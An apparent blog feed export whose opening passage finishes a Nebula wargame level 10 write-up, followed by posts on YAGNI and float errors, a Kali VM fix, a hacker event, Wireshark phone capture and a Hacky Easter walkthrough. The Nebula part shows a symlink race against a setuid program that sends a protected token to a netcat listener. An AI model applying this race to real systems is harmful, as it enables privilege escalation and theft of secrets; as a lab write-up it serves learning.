      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;#undef HITHERE
&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Connected!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Sending file .. &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;ffd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;O_RDONLY&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ffd&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Damn. Unable to open file&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ffd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to read from file: %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strerror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;errno&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;wrote file!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You don't have access to %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Now this one take a bit of playing around to get it right. Basically what we are exploiting here is that the file gets checked and then gets used. The &lt;code&gt;access&lt;/code&gt; call checks the permissions based on the actual user, not the guid user. The file open calls however will run as the guid user. So in between these two calls, we &lt;em&gt;could&lt;/em&gt; modify the target file and get the program to read the right file.&lt;/p&gt;
&lt;p&gt;So ideally we want to create a symlink to a file we own when the &lt;code&gt;access&lt;/code&gt; call runs, then replace that symlink with one that points to the token file. This relies heavily on timing when to update the symlink. I had a play and this is the most reliable way I have found.&lt;/p&gt;
&lt;p&gt;You will need two shells (both on nebula is fine but optional); call them termA and termB. So in termB startup a listening netcat on the relevant port&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level10&amp;#64;nebula:~$&lt;/span&gt; nc -l 18211
&lt;/pre&gt;
&lt;p&gt;in termA we create our symlink, then run the command along with a command to update the symlink&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level10&amp;#64;nebula:/home/flag10$&lt;/span&gt; touch /tmp/mytoken
&lt;span class="gp"&gt;level10&amp;#64;nebula:/home/flag10$&lt;/span&gt; ln -fs /tmp/mytoken /tmp/getme
&lt;span class="gp"&gt;level10&amp;#64;nebula:/home/flag10$&lt;/span&gt; ./flag10 /tmp/getme 192.168.0.8 &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; ln -fs /home/flag10/token /tmp/getme
&lt;span class="go"&gt;[1] 7359
Connecting to 192.168.0.8:18211 .. level10&amp;#64;nebula:/home/flag10$ Connected!
Sending file .. wrote file!&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Meanwhile, back in termB&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
&lt;/span&gt;&lt;span class="gp"&gt;level10&amp;#64;nebula:~$&lt;/span&gt; ssh flag10&amp;#64;localhost
&lt;span class="go"&gt;
flag10&amp;#64;localhost's password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

&lt;/span&gt;&lt;span class="gp"&gt;flag10&amp;#64;nebula:~$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;a class="reference external" href="http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/"&gt;Part 2 of Cracking Nebula&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>On YAGNI and TEFNAR</title><link href="http://unlogic.co.uk/2014/05/29/on-yagni-and-tefnar/" rel="alternate"></link><updated>2014-05-29T09:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-05-29:2014/05/29/on-yagni-and-tefnar/</id><summary type="html">&lt;p&gt;You've probably heard of &lt;a class="reference external" href="https://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It"&gt;YAGNI&lt;/a&gt;
but not of TEFNAR. To recap YAGNI stands for &lt;strong&gt;Y&lt;/strong&gt;ou &lt;strong&gt;A&lt;/strong&gt;in't &lt;strong&gt;G&lt;/strong&gt;onna &lt;strong&gt;N&lt;/strong&gt;eed &lt;strong&gt;I&lt;/strong&gt;t and
refers to the development principle of that you shouldn't write a feature that no one has asked for
in the first place as it's probably never going to be needed. Instead wait until
it's a requirement and implement it then. This saves wasted effort and keeps the code base
clean and as small as possible.&lt;/p&gt;
&lt;p&gt;TEFNAR stands for &lt;strong&gt;TE&lt;/strong&gt;chnology &lt;strong&gt;F&lt;/strong&gt;or &lt;strong&gt;N&lt;/strong&gt;o &lt;strong&gt;A&lt;/strong&gt;pparent &lt;strong&gt;R&lt;/strong&gt;eason and is a term
my boss coined (AFAIK). It basically refers to any unnecessary technology that
doesn't really add any functionality to the product. Sure it might look nice, but
is there a reason that's there or does that?&lt;/p&gt;
&lt;p&gt;From this you can probably also see that YAGNI applies &lt;em&gt;before&lt;/em&gt; and TEFNAR for &lt;em&gt;after&lt;/em&gt;
the implementation. So with the background information done let me explain why I am writing
about this. A few people might not like the idea of YAGI and think it's better to
add a feature and make a useful app than omit it. Well allow me to give you an example
from the real world.&lt;/p&gt;
&lt;p&gt;A fellow dev here implemented a feature that showed graphs to the user. He added a
feature to animate the graph points from 0 to their actual value each time you
were shown a graph. A very pretty feature indeed, but it doesn't add anything to
the graph. The animation doesn't represent another bit of data or a sort of
progress bar, it's just eye candy. I argued that although it's pretty people will
tire of it after a while. Much like you tire of most little animations you have to sit
through when you just want the end result. I also argued it's unnecessary complexity
that adds to the risk of introducing bugs and also adds another thing for future devs
to debug. Granted, it didn't take him long to code up, but stay tuned, here comes the
lesson.&lt;/p&gt;
&lt;p&gt;Fast forward a day and I get called over&lt;/p&gt;
&lt;blockquote&gt;
Hey Sven, fancy a Python puzzle?&lt;/blockquote&gt;
&lt;p&gt;I took the bait and headed over.&lt;/p&gt;
&lt;blockquote&gt;
So in the interpreter &lt;code&gt;1.0 &amp;lt; 1.0&lt;/code&gt; is &lt;code&gt;False&lt;/code&gt;, which is correct.
But now look at this *runs small python script*. See here, &lt;code&gt;1.0 &amp;lt; 1.0 True&lt;/code&gt;
How is that?&lt;/blockquote&gt;
&lt;p&gt;I look at the code and notice he's got a loop that adds 0.1 to a variable and
compares that to 1.0. I chuckled.&lt;/p&gt;
&lt;blockquote&gt;
Yeah, that's a different kettle of fish. Floats aren't that accurate that you
can accumulate like that and expect it to be &lt;em&gt;exactly&lt;/em&gt; 1.0. That's the issue.&lt;/blockquote&gt;
&lt;p&gt;He looked a little confused. I explained to him about how floats are represented.
If you are interested you can read up on &lt;a class="reference external" href="https://docs.python.org/2.7/tutorial/floatingpoint.html"&gt;floating point values in Python&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To demonstrate I opened an interpreter and ran this:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
&lt;span class="mf"&gt;0.6&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
&lt;span class="mf"&gt;0.7999999999999999&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I suggested he try the same by incrementing the value by &lt;code&gt;0.2&lt;/code&gt; and the error went away.
He looked a little dejected. I asked what this was for and sure enough, it's how he
animated his graphs, so some points were slightly higher than they should be.&lt;/p&gt;
&lt;p&gt;So be careful when you add code for no other reason than &amp;quot;it looks nice&amp;quot; as it's
just another area where you can introduce bugs. In this case it was a pretty small
issue, but a different feature could affect a larger part of the program or
even other programs.&lt;/p&gt;
</summary></entry><entry><title>Fixing Kali VM after dist-upgrade</title><link href="http://unlogic.co.uk/2014/05/27/fixing-kali-vm-after-dist-upgrade/" rel="alternate"></link><updated>2014-05-27T23:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-05-27:2014/05/27/fixing-kali-vm-after-dist-upgrade/</id><summary type="html">&lt;p&gt;I just did a &lt;code&gt;apt-get dist-upgrade&lt;/code&gt; to bump up to Kali 1.0.7.
I've got it running on VirtualBox, and after it booted back up all the
VBoxAddition features were gone and the keyboard and mouse in X no longer
worked. GRUB was fine however. Poking around the logs a little I discovered
some issues with the mouse driver. Perhaps that was it, but why?&lt;/p&gt;
&lt;p&gt;Long story short it took quite a bit of digging, but I eventually managed
to fix it. First thing is that the &lt;code&gt;pcscd&lt;/code&gt; group just &lt;em&gt;dissapeared&lt;/em&gt;.
All the following commands assume you are root, otherwise
prefix them with &lt;code&gt;sudo&lt;/code&gt;. So I ran&lt;/p&gt;
&lt;p&gt;&lt;code&gt;groupadd pcscd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;to add the group back in. Then run&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apt-get install linux-headers-$(uname -r)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This will take a little while. Once done run&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/init.d/vboxadd setup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And it will build the kernel modules for the additons. One more reboot
and you should be back to a working system with all the integration you
had before.&lt;/p&gt;
&lt;p&gt;I have no idea why this happens, but hopefully this post will help you
should you have the same problem.&lt;/p&gt;
</summary></entry><entry><title>London Hacker Olympics 2014</title><link href="http://unlogic.co.uk/2014/05/26/london-hacker-olympics-2014/" rel="alternate"></link><updated>2014-05-26T20:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-05-26:2014/05/26/london-hacker-olympics-2014/</id><summary type="html">&lt;p&gt;I recently attended the &lt;a class="reference external" href="http://thehackerolympics.com/"&gt;2014 London Hacker Olympics&lt;/a&gt;
and had a blast. Amidst meeting some amazing people and having a lot of
fun, our team managed to get first (second actually, as it was 0 indexed) place,
but only because it went into over time (even though it wasn't a draw), but who's bitter,
right :). Either way, we won some awesome medals&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/K4ftxMo.jpg"&gt;&lt;img alt="" src="http://i.imgur.com/K4ftxMo.jpg" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;Here's the score board at game close (we're Minor Zeta):&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/ILD2eAn.jpg"&gt;&lt;img alt="" src="http://i.imgur.com/ILD2eAn.jpg" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;There was a lot of good competition and a lot of fluxuation on the scoreboard.
At times there wasn't much separating the top teams.
Here's some of them hard at work:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/q58o9LN.jpg"&gt;&lt;img alt="" src="http://i.imgur.com/q58o9LN.jpg" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;The challenges were well thought out and balanced for coders and non coders alike.
I'll be there at the next one, will you? If so, I hope to see you there.&lt;/p&gt;
&lt;p&gt;Anyway it was great and I hope that a few of the people who I told about this URL
are going to be reading this.&lt;/p&gt;
</summary></entry><entry><title>Capturing smartphone traffic - Part 1</title><link href="http://unlogic.co.uk/2014/05/16/capturing-smartphone-traffic-part-1/" rel="alternate"></link><updated>2014-05-16T15:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-05-16:2014/05/16/capturing-smartphone-traffic-part-1/</id><summary type="html">&lt;p&gt;We all carry phones around that are connected to some of network at all times.
Unless you are the truly paranoid or battery saving type, then there will be periods
when your phone is dark.&lt;/p&gt;
&lt;p&gt;But even so, I often wonder what my phone is transmitting when I'm not using it,
or even when I am using it. So in this series I plan on doing some investigation
into what goes in and out of my phone.&lt;/p&gt;
&lt;p&gt;In this post I'll just set up all the bits and pieces to start the monitoring
process and run a quick check to make sure everything works. In the following
parts I'll be taking a look at some common apps and their network chatter. The
idea is to analyse the data and understand their communications. Hopefully we'll
also unearth some interesting things along the way.&lt;/p&gt;
&lt;div class="section" id="what-we-ll-need"&gt;
&lt;h2&gt;What we'll need&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;A smartphone&lt;/li&gt;
&lt;li&gt;A laptop (or similar) to turn into a wireless access point&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt; running on that laptop&lt;/li&gt;
&lt;li&gt;An internet connection&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="setting-up-the-wireless-access-point"&gt;
&lt;h2&gt;Setting up the wireless access point&lt;/h2&gt;
&lt;p&gt;I'm going to cover how to do this part in OSX for now. If I get round
to it I'll add a Linux way to do it too.&lt;/p&gt;
&lt;div class="section" id="osx"&gt;
&lt;h3&gt;OSX&lt;/h3&gt;
&lt;p&gt;First connect the laptop to an ethernet connection. You can't be connected to
a wireless network and create a wireless access point at the same time.
So we will connect to the internet via ethernet and use the wireless radio
for the access point. Once the ethernet connection is up and running, open
&lt;em&gt;System Preferences -&amp;gt; Sharing&lt;/em&gt;. In the list click on the &lt;em&gt;Internet sharing&lt;/em&gt;
entry (not the check box) and select &lt;em&gt;Ethernet&lt;/em&gt; in the &lt;em&gt;Share your connection
from&lt;/em&gt; dropdown. In the &lt;em&gt;To computers using&lt;/em&gt; select &lt;em&gt;Wi-Fi&lt;/em&gt;. Now select the
check box next to &lt;em&gt;Internet Sharing&lt;/em&gt; to turn sharing on.&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/K2Zeyoy.png"&gt;&lt;img alt="" src="http://i.imgur.com/K2Zeyoy.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;If everything went to plan your Wi-Fi indicator should now look like this:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/ecXJUc8.png"&gt;&lt;img alt="" src="http://i.imgur.com/ecXJUc8.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="connect-the-phone"&gt;
&lt;h2&gt;Connect the phone&lt;/h2&gt;
&lt;p&gt;Now we connect tbe phone to the new access point. Go to your wireless network
settings and select the name of the network we created. &lt;strong&gt;slaptop&lt;/strong&gt; in my case.
Once do we need to&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="start-wireshark"&gt;
&lt;h2&gt;Start Wireshark&lt;/h2&gt;
&lt;p&gt;Fireup Wireshark and then select the capture interface. The default will be
eth0 usually. That's the ethernet port, but we want to capture traffic on the
wireless access point. So we need to select &lt;em&gt;en1&lt;/em&gt; (in my case). It's the one
with the wireless icon next to it.&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/9wyI6s6.png"&gt;&lt;img alt="" src="http://i.imgur.com/9wyI6s6.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;Once this is done we'll want to filter out ARP packets as these are of little
interest and there will be quite a few of them. See the screenshot below to
see where to set this.&lt;/p&gt;
&lt;p&gt;Now we press the &lt;em&gt;Capture&lt;/em&gt; button to begin bapturing traffic. Once running we
can check to see if it's working by browsing to a site. I chose this site at
&lt;code&gt;192.30.252.153&lt;/code&gt;. You should see the capture window scroll past with some
traffic going between your phone ip and the site your browsed to.&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/XjFuoOQ.png"&gt;&lt;img alt="" src="http://i.imgur.com/XjFuoOQ.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;div class="section" id="in-the-next-post"&gt;
&lt;h2&gt;In the next post&lt;/h2&gt;
&lt;p&gt;So I'm all set to capture any and all traffic now that goes to and from my phone.
With this I can now open various apps and see what traffic they generate. In
the next posts I plan to see what idle traffic there is (no apps being actively
used) and what traffic some common apps generate. If I'm lucky I might even
discover some interesting things about some apps.&lt;/p&gt;
&lt;p&gt;Stay tuned for part 2.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Hackyeaster All Eggs</title><link href="http://unlogic.co.uk/2014/04/25/hackyeaster-all-eggs/" rel="alternate"></link><updated>2014-04-22T13:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-04-25:2014/04/25/hackyeaster-all-eggs/</id><summary type="html">&lt;p&gt;I started writing these up as separate posts, but then I figured it'd be neater to post them all in one.&lt;/p&gt;
&lt;p&gt;So here you go, all the Hacky Easter eggs. Some answers will guide you directly to the eggs, others will
require a little bit of work to achieve it. But if you got stuck and are wondering where those missing eggs
are, I hope this guide will help you.&lt;/p&gt;
&lt;div class="section" id="egg-0x01-just-for-fun"&gt;
&lt;h2&gt;Egg 0x01 - Just for fun&lt;/h2&gt;
&lt;p&gt;The the first egg is fairly easy. There's two ways to approach this one, but ultimately we need
to stop that egg from spinning so we can scan it. I first thought it was a .gif file and so opened it
in a new tab so I can download it and open it in Gimp or something. Turns out it's a .png, so you can either
&lt;em&gt;Open Image in New Tab&lt;/em&gt; or save it and view it from there to scan the QR code, or remove the CSS class
&lt;em&gt;eggImage pulse&lt;/em&gt; from the &lt;code&gt;img&lt;/code&gt; tag.&lt;/p&gt;
&lt;p&gt;Scan the code and we're done.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x02-dude-where-s-challenge-2"&gt;
&lt;h2&gt;Egg 0x02 - Dude, where's challenge 2?!&lt;/h2&gt;
&lt;p&gt;This egg is a little trickier to get, only because it involves making some mental
connections. First off we have no link, simply the title &lt;em&gt;Challenge 2: Dude, where's challenge 2? It should be after challenge 1.&lt;/em&gt;
So where is it? First of all you'll want to do the most obvious thing, that is enter
&lt;em&gt;http://hackyeaster.hacking-lab.com/hackyeaster/challenges/challenge-two.html&lt;/em&gt; in the address bar.&lt;/p&gt;
&lt;p&gt;So we've done that, we get a 404. Darn. Let's try &lt;em&gt;http://hackyeaster.hacking-lab.com/hackyeaster/challenges/challenge_two.html&lt;/em&gt;.
Another 404. But something is a little weird. Take a look at the 404 from the previous try, it's in Icelandic (or so Chrome tells
us). We also notice that the &lt;em&gt;-two&lt;/em&gt; in our incorrect URL is in red - this doesn't happen in the english 404 page.
So armed with this knowledge we can perhaps try the Icelandic word for two instead. Google translate tells us this is
&lt;em&gt;tveir&lt;/em&gt;. Substituting this for &lt;em&gt;two&lt;/em&gt; in our URL works. We have egg 0x02&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x03-whooo-whooo"&gt;
&lt;h2&gt;Egg 0x03 - Whooo Whooo!&lt;/h2&gt;
&lt;p&gt;This egg is found on the app. Once you open the challenge you will see a kid's drawing of
an owl and some random letters at the bottom.&lt;/p&gt;
&lt;p&gt;Where have we seen letters like that before? Everywhere where you have URL shorteners really.
But which one could it be? Well the image gives us a clue: &lt;a class="reference external" href="http://ow.ly"&gt;ow.ly&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Collect the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x04-nothing-to-see-here"&gt;
&lt;h2&gt;Egg 0x04 - Nothing to see here&lt;/h2&gt;
&lt;p&gt;The page and image tells us that there's nothing to see here. Oh well, let's go back and forget about it.&lt;/p&gt;
&lt;p&gt;No, let's not, let's just do the usual thing of looking at the page source. It's always a good
idea to poke around inside things to figure out how they work. Sometimes they might reveal some useful information.&lt;/p&gt;
&lt;p&gt;And there it is... just below the &lt;code&gt;footer-wrapper&lt;/code&gt; is our easter egg. Albeit in a little
less scannable format. Not to worry, let's figure this out. It looks like raw, base64 image data.
Two ways to approach this one too. Both achieve the same thing, that is to decode base64 data.&lt;/p&gt;
&lt;p&gt;The simplest way to do it is to use an online tool like &lt;a class="reference external" href="http://www.motobit.com/util/base64-decoder-encoder.asp"&gt;the motobit decoder&lt;/a&gt;
. Simply paste the text into the field, select &lt;strong&gt;decode&lt;/strong&gt; then &lt;strong&gt;export to a binary file&lt;/strong&gt; and put whatever filename
you want with a &lt;code&gt;.png&lt;/code&gt; extension. Then click &lt;strong&gt;Convert&lt;/strong&gt; and your image will download.&lt;/p&gt;
&lt;p&gt;Alternatively create a new HTML file and in the header add:&lt;/p&gt;
&lt;pre class="code html literal-block"&gt;
body {
    background-image: url(&amp;quot;data:image/png;base64,&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;base64&lt;/span&gt; &lt;span class="na"&gt;data&lt;/span&gt; &lt;span class="na"&gt;follows&lt;/span&gt; &lt;span class="na"&gt;here&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&amp;quot;);
}
&lt;/pre&gt;
&lt;p&gt;making sure you add the &lt;code&gt;body&lt;/code&gt; tags. View the page in your browser and scan one of the eggs.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x05-pet-shop"&gt;
&lt;h2&gt;Egg 0x05 - Pet Shop&lt;/h2&gt;
&lt;p&gt;This is less of a brain teaser. You just need to find the QR code in the image.
You can do it by just looking at the image and seeing if you can spot it, or
start tweaking colour values and then brightness contrast. Eventually you will
reveal a QR code. I needed to re-trace some of it in order to get it to scan, but
it depends on how well you manage to isolate its colours.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x06-australia"&gt;
&lt;h2&gt;Egg 0x06 - Australia&lt;/h2&gt;
&lt;p&gt;This challenge is in the phone application. Click on it and we get a picture of
Australia. We all know one thing about Australia. No, not that, the other thing.
That's right, they're all upside down. Turn your phone over and screencap the egg to
scan it with your app from your desktop.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x07-e-gg-mail"&gt;
&lt;h2&gt;Egg 0x07 - E(gg)-Mail&lt;/h2&gt;
&lt;p&gt;This one had me too. I decoded the obvious base64 message, but then was stumped as
to how to extract the eggs. A friend of mine (the one with the windows box) managed to
open it in a &lt;em&gt;.msg&lt;/em&gt; viewer and get the attachment that way. A &lt;em&gt;.msg&lt;/em&gt; is an Outlook/MS mail
format. So a viewer to open the file is all that was needed to get the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x08-hidden"&gt;
&lt;h2&gt;Egg 0x08 - &lt;em&gt;hidden&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;This is a hidden egg. But where could it be hiding? Well, have you tried &lt;em&gt;searching&lt;/em&gt; for it?&lt;/p&gt;
&lt;p&gt;At the time of writing searching for &lt;em&gt;hackyeaster&lt;/em&gt; in Google images shows you egg 0x08.
It's actually in the screen shots for the apps. So either go to the AppStore or Google Play
and look for the hacky easter app. Check the screen shots and you will find egg 0x08.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x09-wise-rabbit"&gt;
&lt;h2&gt;Egg 0x09 - Wise Rabbit&lt;/h2&gt;
&lt;p&gt;The Wise Rabbit.. oh he's such a smug bastard. This is a really annoying one because
it's quite easy, but I had to spend quite some time thinking about it. This is where
those many hours spent playing text adventures pays off.&lt;/p&gt;
&lt;p&gt;So what do we notice about this page? First off it tells us to check the green eggs.
First I skimmed the pages again, re-checked all the files and turned up with nothing.
&amp;quot;Quick response&amp;quot; - might this relate to the email challenge? Check again but nothing.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Q&lt;/em&gt;uick &lt;em&gt;R&lt;/em&gt;esponse. QR. So let's just scan the green eggs again, but this time without
the app, but with a separate QR code reader. &lt;strong&gt;Beep&lt;/strong&gt; sure enough, there seems to be
something there. Scan a few eggs and the pass phrase will reveal itself.&lt;/p&gt;
&lt;/div&gt;
